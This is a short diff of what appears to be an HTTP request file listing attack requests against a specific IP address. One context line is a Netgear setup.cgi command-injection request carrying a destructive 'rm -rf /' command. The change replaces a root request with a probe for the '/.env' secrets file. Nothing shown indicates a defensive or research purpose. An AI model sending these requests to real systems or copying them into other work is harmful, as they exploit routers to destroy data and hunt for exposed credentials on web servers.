@@ -21,7 +21,7 @@ GET http://3.142.87.225/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/
 
 ###
 
-GET http://3.142.87.225/ HTTP/1.1
+GET http://3.142.87.225/.env HTTP/1.1
 
 ###
 
